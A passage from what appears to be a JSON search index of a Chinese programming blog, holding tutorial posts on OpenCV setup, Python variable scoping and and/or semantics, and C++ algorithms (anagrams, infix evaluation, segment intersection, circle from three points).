如果你的计算机中有摄像头这个硬件设备的话，那么将VideoCapture对象初始化为0，就可以调用摄像头了。","categories":[{"name":"图像处理","slug":"图像处理","permalink":"http://coordinate.wang/categories/图像处理/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"}]},{"title":"VS2015+opencv3.3环境配置(win10)，超详细！！！","slug":"2017-10-11-VS2015+opencv3.3环境配置(win10)，超详细！！！","date":"2017-10-10T16:00:00.000Z","updated":"2018-02-18T03:29:07.322Z","comments":true,"path":"2017/10/11/2017-10-11-VS2015+opencv3.3环境配置(win10)，超详细！！！/","link":"","permalink":"http://coordinate.wang/2017/10/11/2017-10-11-VS2015+opencv3.3环境配置(win10)，超详细！！！/","excerpt":"","text":"首先下载opencv3.3，然后安装。 安装完成后，接下来配置环境变量。具体步骤如下：右击此电脑-》点击属性-》点击更改设置-》点击高级-》点击环境变量-》点击Path-》点击编辑，如果还是不清楚的话点击这里 点击新建，将我们安装opencv3.3的位置下的bulid\\x64\\vc14\\bin 加入。 打开VS2015，新建一个项目文件 新建一个win32控制台应用程序，名称可以自己取一个 勾选上空项目 右击源文件文件夹，添加新文件，文件名自己随便取一个 点击视图-》点击其他窗口打开属性管理器 在属性管理器栏中，选中Debug|Win64中的Microsoft.Cpp.x64.user，右键点击属性进入属性界面 点击VC++目录-》点击包含目录-》点击编辑 将之前的安装目录下的这三个目录添加进去 123F:\\openCV\\opencv\\build\\includeF:\\openCV\\opencv\\build\\include\\opencvF:\\openCV\\opencv\\build\\include\\opencv2 做好这个后，回到VC++目录-》点击库目录-》点击编辑 将之前的安装目录下的这个目录添加进去 1F:\\openCV\\opencv\\build\\x64\\vc14\\lib 在F:\\openCV\\opencv\\build\\x64\\vc14\\lib目录下有这样两个文件opencv_world330.lib和opencv_world330d.lib，文件的区别是一个没有d结尾的对应的时release版，以d结尾的文件对应的是debug版。 做好这个后，回到初始的目录，点击链接器-》点击输入-》点击附加依赖项-》点击编辑 我这里将debug版（opencv_world330d.lib）添加进去，当然你也可以添加release版。 接着你要设置VS2015是x64和debug 所有东西都配置好了，接下来测试能不能用opencv。代码如下： 12345678910111213#include &lt;iostream&gt; #include &lt;opencv2/core/core.hpp&gt; #include &lt;opencv2/highgui/highgui.hpp&gt; using namespace cv;int main() &#123; Mat img = imread(\"avatar.jpg\"); // 在窗口中显示avatar imshow(\"avatar\", img); // 等待6000 ms后窗口自动关闭 waitKey(6000);&#125; 我在运行时发现爆出如下错误： 原来我把测试图片的位置放错了。正确的做法是： 最后程序正常运行^_^!!!","categories":[{"name":"图像处理","slug":"图像处理","permalink":"http://coordinate.wang/categories/图像处理/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"opencv","slug":"opencv","permalink":"http://coordinate.wang/tags/opencv/"}]},{"title":"python和C语言中的全局变量的区别","slug":"2017-10-10-python和C语言中的全局变量的区别","date":"2017-10-09T16:00:00.000Z","updated":"2018-02-18T03:29:07.306Z","comments":true,"path":"2017/10/10/2017-10-10-python和C语言中的全局变量的区别/","link":"","permalink":"http://coordinate.wang/2017/10/10/2017-10-10-python和C语言中的全局变量的区别/","excerpt":"","text":"问题的引出： 12345x = 5def Func(): x *= x print(x)Func() 报错信息 123456Traceback (most recent call last): File &quot;new 2.py&quot;, line 5, in &lt;module&gt; Func() File &quot;new 2.py&quot;, line 3, in Func x *= xUnboundLocalError: local variable &apos;x&apos; referenced before assignment 这里为什么说x在赋值前被引用错误呢？明明我声明了一个全局变量x啊(这是一个c/c++程序员的想法^_^!!!)，在c语言中这样做确实没有问题。如下： 12345678910int x = 5;void fun(void)&#123; x *= x; print(\"%d\", x);&#125;int main(void)&#123; fun();&#125; 但是为什么在python里面就行不通了呢？ python里面的变量有些类似于C语言中的指针变量，你这样一想的话，有些问题就明白了。比如说为什么python里面的list可以容纳不同类型的变量？又比如说python里面变量声明时不区分类型？另外，还要知道的一点是，python在赋值时，会为数值分配一块内存空间，然后通过变量去指向这块内存空间。如果修改变量的值，实际上就是变量指向了不同的内存空间。如下： 123456&gt;&gt;&gt; a = 1&gt;&gt;&gt; id(a)1802679360&gt;&gt;&gt; a = 3&gt;&gt;&gt; id(a)1802679424 ok，回到原来的问题。x*=x 相当于x = x*x ，也就是左边的x指向了右边生成的内存空间，这里要注意，前后x指向的内存发生了变化，如下 12345678x = 5def Func(): global x print(id(x)) x*=x print(id(x)) print(x)Func() 结果是 1231802679488180268012825 当这个变量在右边的时候相当于取内存操作，python里面如果要对一个全局变量取内存操作的话，必须要提前声明这个变量是global 的，也就是上面代码里的做法。关键问题来了，我函数里的x不可以取外面x的内存里的东西吗？可以！！！ 123456x = 5print(id(x))def Func(): print(id(x)) print(x)Func() 结果是 123180267948818026794885 并没有出现问题，而且前后的x是同一个，而且我没有声明global。分析这个例子和上面的例子不难发现问题所在，问题出现在这个赋值操作上。所以我们大致总结为以下几点： 如果函数中出现赋值操作，则左边的变量会被标记为局部变量，如果变量名和函数外的变量名重名，函数外的变量将会被屏蔽。这时如果想要使用函数外的变量的话，要做global声明。 如果函数中没有出现赋值操作，那么函数中可以直接使用全局变量","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"}]},{"title":"python中的and和or","slug":"2017-10-08-python中的and和or","date":"2017-10-07T16:00:00.000Z","updated":"2018-02-18T03:29:07.306Z","comments":true,"path":"2017/10/08/2017-10-08-python中的and和or/","link":"","permalink":"http://coordinate.wang/2017/10/08/2017-10-08-python中的and和or/","excerpt":"","text":"在python中and和or返回的值并不是True和false这么简单。虽然他们看上去和c++中的&amp;&amp;和||有些相似。在了解and和or之前，我们先要了解python中的True和False。 在python里面，0、’’、[]、()、{}、None为假，其它任何东西都为真。ok，在此前提下。看这样一个例子： 123456&gt;&gt;&gt; 'a' and 'b' 'b' &gt;&gt;&gt; '' and 'b' '' &gt;&gt;&gt; 'a' and 'b' and 'c' 'c' 我们大致可以总结出这样的一个规律，对于and，如果没有假值，返回的是最后一个真值，如果有假值，则返回的是第一个假值。 123456&gt;&gt;&gt; 'a' or 'b' 'a' &gt;&gt;&gt; '' or 'b' 'b' &gt;&gt;&gt; '' or [] or&#123;&#125; &#123;&#125; 对于or，如果没有真值，返回的是最后一个假值，如果有真值，则返回的是第一个真值。 知道了这些我们就可以模拟出c语言中的三目运算符操作a ? b : c 123456&gt;&gt;&gt; a = \"haha\"&gt;&gt;&gt; b = \"hehe\" &gt;&gt;&gt; 1 and a or b 'haha'&gt;&gt;&gt; 0 and a or b 'hehe' 但是这样做会出现一个问题，如下 1234&gt;&gt;&gt; a = \"\"&gt;&gt;&gt; b = \"hehe\" &gt;&gt;&gt; 1 and a or b 'hehe' 解决办法如下 1(1 and [a] or [b])[0] 解决思路就是，对于[&#39;&#39;]，我们知道它为真，即上面的式子中括号里面的值是[&#39;&#39;]，[&#39;&#39;][0] 的结果就是&#39;&#39; 。","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"}]},{"title":"变位词问题","slug":"2017-10-03-变位词问题","date":"2017-10-02T16:00:00.000Z","updated":"2018-02-18T03:29:07.306Z","comments":true,"path":"2017/10/03/2017-10-03-变位词问题/","link":"","permalink":"http://coordinate.wang/2017/10/03/2017-10-03-变位词问题/","excerpt":"","text":"如果能够通过改变一个单词的字母顺序，来得到另一个单词。我们称这两个单词是变位词。例如单词tea和eat是变位词。 一个简单的处理思路是，通过判断一个单词中的各字母数量与另一个单词中的是不是一样。如果你对于c++标准库很熟悉的话，这个问题很快就解决了（使用is_permutation） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/***********************************************************2017_10_3 by coordinte*变位词问题*win10 vs2015 x86 debug *www.coordinate.wang************************************************************/#include &lt;iostream&gt;#include &lt;set&gt;#include &lt;string&gt;#include &lt;iterator&gt;#include &lt;algorithm&gt;using std::string;int main()&#123; string first, second; std::multiset&lt;char&gt; word_f, word_s; std::cout &lt;&lt; \"Enter first word: \\n\"; std::cin &gt;&gt; first; std::cout &lt;&lt; \"Enter second word: \\n\"; std::cin &gt;&gt; second; std::for_each(std::begin(first), std::end(first), [&amp;word_f](const char&amp; c) &#123; word_f.emplace(c); &#125;); std::for_each(std::begin(second), std::end(second), [&amp;word_s](const char&amp; c) &#123; word_s.emplace(c); &#125;); if (first.length() == second.length()) &#123; for (auto iter = std::begin(first); iter != std::end(first); ++iter) &#123; if (word_f.count(*iter) != word_s.count(*iter)) &#123; std::cout &lt;&lt; \"The words are not anagrams.\"; return 0; &#125; &#125; std::cout &lt;&lt; \"The words are anagrams.\"; &#125; else std::cout &lt;&lt; \"The words are not anagrams.\"; system(\"pause\");&#125; 12345678910111213141516171819202122232425/***********************************************************2017_10_3 by coordinte*变位词问题*win10 vs2015 x86 debug *www.coordinate.wang************************************************************/#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;iterator&gt;#include &lt;algorithm&gt;using std::string;int main()&#123; string first, second; std::cout &lt;&lt; \"Enter first word: \\n\"; std::cin &gt;&gt; first; std::cout &lt;&lt; \"Enter second word: \\n\"; std::cin &gt;&gt; second; if (std::is_permutation(std::begin(first), std::end(first), std::begin(second), std::end(second))) std::cout &lt;&lt; \"The words are anagrams.\"; else std::cout &lt;&lt; \"The words are not anagrams.\"; system(\"pause\");&#125; 我在这里都没有考虑字符的大小写问题，这些都是要做预处理的，我在这就不赘述了。 关于is_permutation的一个可能的实现 12345678910111213141516171819202122template&lt;class ForwardIt1, class ForwardIt2&gt;bool is_permutation(ForwardIt1 first, ForwardIt1 last, ForwardIt2 d_first)&#123; // skip common prefix std::tie(first, d_first) = std::mismatch(first, last, d_first); // iterate over the rest, counting how many times each element // from [first, last) appears in [d_first, d_last) if (first != last) &#123; ForwardIt2 d_last = d_first; std::advance(d_last, std::distance(first, last)); for (ForwardIt1 i = first; i != last; ++i) &#123; if (i != std::find(first, i, *i)) continue; // already counted this *i auto m = std::count(d_first, d_last, *i); if (m==0 || std::count(i, last, *i) != m) &#123; return false; &#125; &#125; &#125; return true;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/categories/算法/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/tags/算法/"}]},{"title":"后缀表达式计算四则运算","slug":"2017-10-02-后缀表达式问题","date":"2017-10-01T16:00:00.000Z","updated":"2018-02-18T03:29:07.302Z","comments":true,"path":"2017/10/02/2017-10-02-后缀表达式问题/","link":"","permalink":"http://coordinate.wang/2017/10/02/2017-10-02-后缀表达式问题/","excerpt":"","text":"我们平时书写的算术表达式都是中序表达式，例如 (1 + 2) x 3/4 - 5 而对应的后缀表达式就是 12+3x4/5- 如何由中序表达式变为后缀表达式呢？具体做法如下： 建立符号栈s 从左向右扫描中序表达式 碰到数字，直接输出 碰到运算符 如果s为空或者栈顶元素为左括号，则压入s，回到从左向右扫描中序表达式 运算符的优先级大于s栈顶运算符的优先级，压入s，回到从左向右扫描中序表达式 运算符的优先级小于或者等于s栈顶运算符的优先级，弹出并输出s栈顶元素，回到碰到运算符 如果是左括号，压入s 如果是右括号 弹出s栈顶元素 如果弹出的栈顶元素是左括号，则不输出，回到从左向右扫描中序表达式 如果弹出的栈顶元素不是左括号，则输出，回到弹出s栈顶元素 弹出并输出s中的符号 所以对于$(1+2)\\times3/4-5$可以这样去做 建立符号栈s 12输出：s: 从左向右扫描，第一个左括号，压入s 12输出：s:( 1，输出 12输出：1s:( +，栈顶元素为左括号，压入s 12输出：1s:(+ 2，输出 12输出：12s:(+ 右括号，弹出栈顶元素+并输出 12输出：12+s:( 栈顶元素是左括号 12输出：12+s: x，压入s 12输出：12+s:x 3，输出 12输出：12+3s:x /，优先级等于栈顶元素优先级，弹出并输出栈顶元素 12输出：12+3xs: 栈为空，压入s 12输出：12+3xs:/ 4，输出 12输出：12+3x4s:/ -，优先级小于栈顶元素优先级，弹出并输出栈顶元素 12输出：12+3x4/s: 栈为空，压入s 12输出：12+3x4/s:- 5，输出 12输出：12+3x4/5s:- 弹出并输出s 12输出：12+3x4/5-s: 关于后缀表达式的计算，就是所有的计算按运算符出现的顺序，严格从左向右进行即可。但是我们是不是每次都要先将中缀转化为后缀在计算呢？如何按后缀表达式方式的思想计算中序表达式呢？具体做法如下： 建立数字栈s1，符号栈s2 表达式不为空，从左向右扫描中序表达式 碰到数字压入s1 碰到操作符 如果s2为空或栈顶元素为左括号，则压入s2，回到从左向右扫描中序表达式 如果s2不空，且运算符的优先级和s2栈顶的运算符优先级高，则将这个运算符压入s2 ，回到从左向右扫描中序表达式 如果s2不空，且运算符的优先级比s2栈顶的运算符优先级相同或比其低，则从s1 中弹出两个数字与s1栈顶弹出的运算符做运算，将结果压入s1，然后回到碰到操作符。 碰到左括号，则压入s2 碰到右括号 如果s2栈顶元素不是左括号，则从s1 中弹出两个数字与s1栈顶的运算符做运算，将结果压入s1 如果s2栈顶元素是左括号，弹出左括号 表达式为空，如果s2不为空，则从s1 中弹出两个数字与s2栈顶弹出的运算符做运算，将结果压入s1，直到s2为空 如果s1只有一个，ok，否则肯定就出错了^_^! 对于$(1+2)\\times3/4-5$这样计算 建立s1,s2 12s1:s2: 左括号，压入s2 12s1:s2:( 1，压入s1 12s1:1s2:( +，s2为空，压入s2 12s1:1s2:(+ 2，压入s1 12s1:12s2:(+ 右括号，s2栈顶元素不是左括号，则从s1 中弹出两个数字与s1栈顶的运算符做运算，将结果压入s1 12s1:3s2:( s2栈顶元素是左括号，弹出左括号 12s1:3s2: x，s2为空，压入s2 12s1:3s2:x 3，压入s1 12s1:33s2:x /，s2不空，且运算符的优先级和s2栈顶的运算符优先级相同，则将这个运算符压入s2 12s1:33s2:x/ 4，压入s1 12s1:334s2:x/ -，s2不空，且运算符的优先级比s2栈顶的运算符优先级相同或比其低，则从s1 中弹出两个数字与s1栈顶弹出的运算符做运算，将结果压入s1 12s1:3 0.75s2:x s2不空，且运算符的优先级比s2栈顶的运算符优先级相同或比其低，则从s1 中弹出两个数字与s1栈顶弹出的运算符做运算，将结果压入s1 12s1:2.25s2: s2为空，压入s2 12s1:2.25s2:- 5，压入s1 12s1:2.25 5s2:- s2不为空，则从s1 中弹出两个数字与s2栈顶弹出的运算符做运算，将结果压入s1 12s1:-2.75s2: 最后一个问题就是关于负数和浮点数的问题，关于这方面的处理我放在了代码中。负数的问题，主要分为减号语意和负数语意去处理。我觉得这里最简单的方式，就是对于负号前面空或者是左括号，我们给它插上个0，这样问题就归为了减号语意一个问题。当然分两个去做也没有问题，只是讨论情况会很麻烦。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/***********************************************************2017_10_2 by coordinte*前缀四则运算*win10 vs2015 x86 debug *www.coordinate.wang************************************************************/#include &lt;iostream&gt;#include &lt;stack&gt; //内部是通过deque实现的#include &lt;string&gt;#include &lt;map&gt;#include &lt;cctype&gt; //isdigit#include &lt;cstdlib&gt; //stod#include &lt;stdexcept&gt;#include &lt;algorithm&gt; //removeusing std::string;//运算符的优先级std::map&lt;char, int&gt; priority&#123; &#123; '+', 1 &#125;, &#123; '-', 1 &#125;, &#123; '*', 2 &#125;, &#123; '/', 2 &#125; &#125;; //计算两个数的值，返回结果double execute(std::stack&lt;char&gt;&amp; ops, std::stack&lt;double&gt;&amp; operands)&#123; double result&#123;&#125;; double rhs&#123; operands.top() &#125;; operands.pop(); double lhs&#123; operands.top() &#125;; operands.pop(); switch (ops.top()) &#123; case '+': result = lhs + rhs; break; case '-': result = lhs - rhs; break; case '*': result = lhs * rhs; break; case '/': result = lhs / rhs; break; default: throw std::runtime_error&#123; string&#123; \"invalid operator: \" + ops.top() &#125; &#125;; &#125; ops.pop(); operands.push(result); return result;&#125;//将输入字符串转化为前缀形式double toSuffix(string str_in)&#123; std::stack&lt;char&gt; operators; std::stack&lt;double&gt; operands; size_t index&#123;&#125;; //标记字符串中数字的下一个字符的位置 size_t i&#123;&#125;; //标记字符的位置www.coordinate.wang while (i &lt; str_in.length()) &#123; char s_i = str_in[i]; if (s_i == '(') &#123; operators.push(s_i); ++i; &#125; else if (s_i == ')') &#123; char temp&#123;&#125;; while ((temp = operators.top()) != '(') &#123; execute(operators, operands); if (operators.empty()) &#123; return -1; &#125; &#125; //去除temp operators.pop(); ++i; &#125; //处理操作符 else if (priority.count(s_i)) &#123; while (!operators.empty() &amp;&amp; operators.top() != '(' &amp;&amp; priority.at(s_i) &lt;= priority.at(operators.top())) &#123; execute(operators, operands); &#125; operators.push(s_i); ++i; &#125; else//处理数字 &#123; double number = std::stod(str_in.substr(i), &amp;index); operands.push(number); i += index; &#125; &#125; while (!operators.empty()) &#123; execute(operators, operands); &#125; double result = operands.top(); operands.pop(); if (!operands.empty()) return -1; return result;&#125;//输入字符串的小数点前要有数字，如0.1，不可以是.1int main()&#123; string str_in; std::cout &lt;&lt; \"An arithmetic can include the operators +,-,*,/.\" &lt;&lt; std::endl; try &#123; while (true) &#123; std::cout &lt;&lt; \"Enter an arithmetic expression and press Enter\" &lt;&lt; \" - enter an empty line to end:\" &lt;&lt; std::endl; std::getline(std::cin, str_in, '\\n'); if (str_in.empty()) break; //删除空格 str_in.erase(std::remove(std::begin(str_in), std::end(str_in), ' '), std::end(str_in)); //如果负号前面是空或者左括号的话插入0 for (size_t i = 0; i &lt; str_in.length(); ++i) &#123; if (str_in[i] == '-' &amp;&amp; i == 0) &#123; str_in.insert(0, 1, '0'); &#125; else if (str_in[i] == '-' &amp;&amp; str_in[i - 1] == '(') &#123; str_in.insert(i, 1, '0'); &#125; &#125; std::cout &lt;&lt; toSuffix(str_in) &lt;&lt; std::endl; &#125; &#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; e.what() &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"Calculator ending ...\" &lt;&lt; std::endl; system(\"pause\");&#125; 这个程序稍加改动就可以输出后缀表达式了。不再赘述，留给读者思考。","categories":[{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/categories/算法/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/tags/算法/"}]},{"title":"判断两个线段相交，求交点","slug":"2017-09-29-判断两个线段相交","date":"2017-09-28T16:00:00.000Z","updated":"2018-02-18T03:29:07.293Z","comments":true,"path":"2017/09/29/2017-09-29-判断两个线段相交/","link":"","permalink":"http://coordinate.wang/2017/09/29/2017-09-29-判断两个线段相交/","excerpt":"","text":"我们首先将问题分成如下几个小问题讨论 首先要解决的第一个问题是判断直线是否平行 ，我们首先假设四个点的坐标为 前两个点为a(x1, y1), b(x2, y2) 后两个点为 c(x3, y3), d(x4, y4)，求出两个直线的方向向量$\\vec{e1}=(x1 - x2, y1 - y2)$, $\\vec{e2} = (x3 - x4, y3 - y4)$。 通过$\\vec{e1}$, $\\vec{e2}$求得$\\vec{e1}\\times\\vec{e2}=theta=(e1_xe2_y - e1_ye2_x)$ ，如果theta为0则表示平行。接着我们要判断是否共线，很简单，我们求出这两之间的任意向量，如$\\vec{e3}$=(x1 - x3, y1 - y3)，求$\\vec{e1}\\times\\vec{e3} = beta = (e1_xe3_y - e1_ye3_x)$ ，如果beta=0，则表示两个线段共线，否则不共线即不相交。接着判断是否重合，很简单的一个方法就是，我们可以先将这些点按从低到高排好顺序，去比较几何位置即可。 如果两个线段不平行的话，等于分成了3种情况。首先我们判断是否跨交。也就是判断a,b是不是在c,d两边，c,d同时是不是也在a,b的两边。我们可以求$\\vec{m}=(x1 - x3, y1 - y3)$,$\\vec{n}=(x1 - x4, y1 - y4)$,$\\vec{k}=(x2 - x4, y2 - y4)$ 通过判断$\\vec{m}\\times\\vec{e1}$与$\\vec{n}\\times\\vec{e1}$是否异号就可以判断出c,d是否在a,b两侧，如果异号说明在两边，如果同号则不在。另外判断a,b是否在c,d两侧同理可得。 如果跨交的话求交点。 设交点为(x0, y0)，则下列方程组必然成立： x0-x1=k1(x2-x1) y0-y1=k1(y2-y1) x0-x3=k2(x4-x3) y0-y3=k2(y4-y3) 其中k1和k2为任意不为0的常数（若为0，则说明有重合的端点，这种情况在上面已经被排除了）。1式与2式联系，3式与4式联立，消去k1和k2可得： x0(y2-y1)-x1(y2-y1)=y0(x2-x1)-y1(x2-x1) x0(y4-y3)-x3(y4-y3)=y0(x4-x3)-y3(x4-x3) 将含有未知数x0和y0的项移到左边，常数项移动到右边，得： (y2-y1)x0+(x1-x2)y0=(y2-y1)x1+(x1-x2)y1 (y4-y3)x0+(x3-x4)y0=(y4-y3)x3+(x3-x4)y3 设两个常数项分别为b1和b2： a1=(y2-y1)x1+(x1-x2)y1 a2=(y4-y3)x3+(x3-x4)y3 系数行列式的值为theta，用a1和a2替换x0的系数所得系数行列式的值为theta1，替换y0的系数所得系数行列式的值为D2，则有： theta=(x2-x1)(y4-y3)-(x4-x3)(y2-y1) theta1=a2(x2-x1)-a1(x4-x3) theta2=a2(y2-y1)-a1(y4-y3) 由此，可求得交点坐标为： x0=|theta1|/|theta|, y0=|theta2|/|theta| 如果是交于端点的话通过判断集合位置关系就可以判断出来了。 下面是代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include &lt;iostream&gt;#include &lt;cmath&gt;//判断两个像素是否相等bool equal(double x, double y)&#123; return std::abs(x - y) &lt; 1e-7;&#125;class point&#123;public: point(double x = 0.0, double y = 0.0) :x(x), y(y) &#123;&#125; bool operator==(const point&amp; rhs) const; bool operator!=(const point&amp; rhs) const; bool operator&lt;(const point&amp; rhs) const; bool operator&gt;(const point&amp; rhs) const; point operator-(const point&amp; rhs) const; point operator+(const point&amp; rhs) const; static double cross_product(const point&amp; p1, const point&amp; p2); double pointX() &#123; return this-&gt;x; &#125; double pointY() &#123; return this-&gt;y; &#125;private: double x, y;&#125;;bool point::operator==(const point &amp; rhs) const&#123; return equal(x, rhs.x) &amp;&amp; equal(y, rhs.y);&#125;bool point::operator!=(const point &amp; rhs) const&#123; return (x != rhs.x)&amp;&amp;(y != rhs.y);&#125;bool point::operator&lt;(const point &amp; rhs) const&#123; return false;&#125;bool point::operator&gt;(const point &amp; rhs) const&#123; return false;&#125;point point::operator-(const point &amp; rhs) const&#123; return point(x - rhs.x, y - rhs.y);&#125;point point::operator+(const point &amp; rhs) const&#123; return point(x + rhs.x, y + rhs.y);&#125;double point::cross_product(const point &amp; p1, const point &amp; p2)&#123; return (p1.x*p2.y - p2.x*p1.y);&#125;//判断两个线段是否相交//相交返回1，重合返回2，不相交返回3//出错返回-1int cross(point&amp; a, point&amp; b, point&amp; c, point&amp; d, point&amp; f)//a,b表示一个线段;c,d表示一个线段， f表示交点坐标&#123; //如果线段长度为0，则退出 if (a == b || c == d) &#123; return -1; &#125;//判断两个是否平行//得到线段的向量x, y point x = a - b; point y = c - d; //计算差乘 double theta = point::cross_product(x, y); if (a &gt; b) &#123; std::swap(a, b); &#125; if (c &gt; d) &#123; std::swap(c, d); &#125; if (equal(theta, 0)) &#123; //平行时 point m = a - c; point n = b - a; double beta = point::cross_product(m, n);//计算是否共线 if (equal(beta, 0)) &#123; //平行共线 //通过判断坐标关系确定是否重合 if ((a &lt; c &amp;&amp; c &lt; d) || (d &lt; b &amp;&amp; a &lt; d)) &#123; //重合 return 2; &#125; else if (b == c) &#123; f = b; return 1; &#125; else if (a == d) &#123; f = a; return 1; &#125; else &#123; //不重合 return 3; &#125; &#125; else &#123; //平行不共线且无交点 return 3; &#125; &#125; else &#123;//不平行时 point m = a - c; point n = b - c; point k = b - d; double gama1 = point::cross_product(m, y); double gama2 = point::cross_product(n, y); double gama3 = point::cross_product(n, x); double gama4 = point::cross_product(k, x); //不平行且相交 if (((gama1 &gt; 0 &amp;&amp; gama2 &lt; 0) || (gama1 &lt; 0 &amp;&amp; gama2 &gt; 0)) &amp;&amp; ((gama3 &gt; 0 &amp;&amp; gama4 &lt; 0) || (gama3 &lt; 0 &amp;&amp; gama4 &gt; 0))) &#123; double a1 = (b.pointY() - a.pointY())*a.pointX() + (a.pointX() - b.pointX())*a.pointY(); double a2 = (d.pointY() - c.pointY())*c.pointX() + (c.pointX() - d.pointX())*c.pointY(); double theta1 = (b.pointX() - a.pointX())*a2 - (d.pointX() - c.pointX())*a1; double theta2 = (b.pointY() - a.pointY())*a2 - (d.pointY() - c.pointY())*a1; double px = std::abs(theta1) / std::abs(theta); double py = std::abs(theta2) / std::abs(theta); f = point(px, py); return 1; &#125; else if (b == c)//不平行交于端点 &#123; f = b; return 1; &#125; else if (a == d) &#123; f = a; return 1; &#125; else &#123; //不平行不相交 return 3; &#125; &#125; &#125;int main()&#123; point p1(0, 0), p2(2, 2), p3(1, 1), p4(3, 3), f; int n = cross(p1, p2, p3, p4, f); system(\"pause\");&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/categories/算法/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/tags/算法/"}]},{"title":"抽象类中的数据","slug":"2017-09-28-纯虚函数的调用","date":"2017-09-27T16:00:00.000Z","updated":"2018-02-18T03:29:07.277Z","comments":true,"path":"2017/09/28/2017-09-28-纯虚函数的调用/","link":"","permalink":"http://coordinate.wang/2017/09/28/2017-09-28-纯虚函数的调用/","excerpt":"","text":"纯虚函数的调用问题中我们谈到了我们可以去调用纯虚函数。 123456789101112131415161718192021222324class Abstract_base&#123;public: virtual ~Abstract_base(); virtual void interface() = 0; const char* mumble() const &#123; return _mumble; &#125;protected: char *_mumble;&#125;;class Concrete_derived :public Abstract_base&#123;public: void Concrete_deriverd(); virtual void interface();&#125;;inline void Abstract_base::interface()&#123; function //...&#125;inline void Concrete_derived::interface()&#123; Abstract_base::interface();//静态调用&#125; 不过这可以通过静态调用，不可以通过虚拟机制去调用。 有的初学者这里又会有一个疑问，就是我在抽象类的里面设计了一个数据类型，为什么要在一个接口里面设计数据类型呢？因为如果存在“共享数据”的话，这种设计是合理的。 还有一个问题就是我们该怎么去初始化这个数据呢？我们先看看如果不初始化会出现什么问题。 1234void foo()&#123; Concrete_derived trouble;//Abstract_base::_mumble未被初始化&#125; 你看到了问题吗？派生类没有初始化这个数据。那是不是把这个初始化任务交给派生类去做，而不是交给抽象类去做呢？该怎么做呢？ 确实，应该由派生类去初始化这个数据。做法如下： 123456789101112131415161718class Abstract_base&#123;public: virtual ~Abstract_base(); virtual void interface() = 0; const char* mumble() const &#123; return _mumble;&#125;protected: Abstract_base(char *pc = 0);//增加 char *_mumble;&#125;;Abstract_base::Abstract_base(char *pc = 0):_mumble(pc)&#123;&#125;class Concrete_derived :public Abstract_base&#123;public: void Concrete_deriverd(char *p = 0); virtual void interface();&#125;;Concrete_deriverd::Concrete_deriverd(char *p = 0):Abstract_base(p)&#123;&#125; 要使用派生类去初始化基类的数据，派生类的唯一要求就是基类必须提供带有唯一参数的保护类型的构造函数。 一般而言class的data member应该被初始化，并且只在constructor中或class的其他member functions中指定初值。其他任何操作都将会破坏封装型，使class的维护变得困难。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"三个点确定一个圆","slug":"2017-09-24-三个点确定一个圆","date":"2017-09-23T16:00:00.000Z","updated":"2018-02-18T03:29:07.277Z","comments":true,"path":"2017/09/24/2017-09-24-三个点确定一个圆/","link":"","permalink":"http://coordinate.wang/2017/09/24/2017-09-24-三个点确定一个圆/","excerpt":"","text":"首先假设圆心为(x0, y0)，半径为r。则这个圆可以表示为： $(x - x0)^2+(y - y0)^2 = r^2​$ 假设知道的三个点为(x1, y1)，(x2,y2)，(x3,y3)。那么： $(x1 - x0)^2+(y1 - y0)^2 = r^2$ $(x2 - x0)^2+(y2 - y0)^2 = r^2$ $(x3 - x0)^2+(y3 - y0)^2 = r^2$ 消去$r^2$后变成 $(x1 - x0)^2+(y1 - y0)^2 = (x2 - x0)^2+(y2 - y0)^2 $ $(x1 - x0)^2+(y1 - y0)^2 = (x3 - x0)^2+(y3 - y0)^2 $ 将未知量x0,y0移到左边就变为 $(x1 - x2)x0 + (y1 - y2)y0 = \\frac{(x1^2 - x2^2) + (y1^2 - y2^2)}{2}$ $(x1 - x3)x0 + (y1 - y3)y0 = \\frac{(x1^2 - x3^2) + (y1^2 - y3^2)}{2}$ 首先我们要确定这个方程是不是有解，很简单，即判断行列式 $ \\left| \\begin{array} ((x1 - x2) &amp; (y1 - y2) \\(x1 - x3) &amp; (y1 - y3) \\end{array} \\right | \\neq 0$ 设两个常量a1,a2 $a1 = \\frac{(x1^2 - x2^2) + (y1^2 - y2^2)}{2}$ $a2 = \\frac{(x1^2 - x3^2) + (y1^2 - y3^2)}{2}$ 那么 $x0 = \\frac{(y1 - y2)a2 - (y1 - y3)a1}{(y1 - y2)(x1 - x3)-(x1 - x2)(y1-y3)}$ $y0 = \\frac{(x1 - 